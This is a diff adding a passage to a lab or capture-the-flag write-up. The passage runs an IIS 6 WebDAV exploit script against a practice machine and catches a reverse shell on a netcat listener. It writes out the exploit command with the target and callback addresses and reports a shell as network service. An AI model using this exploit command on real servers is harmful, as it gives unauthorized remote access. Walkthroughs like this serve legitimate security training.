@@ -106,8 +106,25 @@ usage:iis6webdav.py targetip targetport reverseip reverseport
 ```
 So, we have to specify the targetip and targetport, also our tun0 ip address and the port we plan on listening on
 
+Lets start out by setting up our netcat listener
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8f60c83d-2047-433b-8acc-59c5258cf23e)
+
+Now, lets run the exploit
+
+command:```python2 iis6\ reverse\ shell 10.129.127.13 80 10.10.14.142 1234```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0f073bc7-316c-4f62-820c-d68f28347e0c)
+
+Checking our netcat listener,
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ebd2bbd1-f8e2-4d49-b4e7-09083381a065)
+
+We got a shell as ```nt authority\network service```. Lets go ahead and escalate our privileges
 
 
+
+# Privilege Escalation
 
 
 
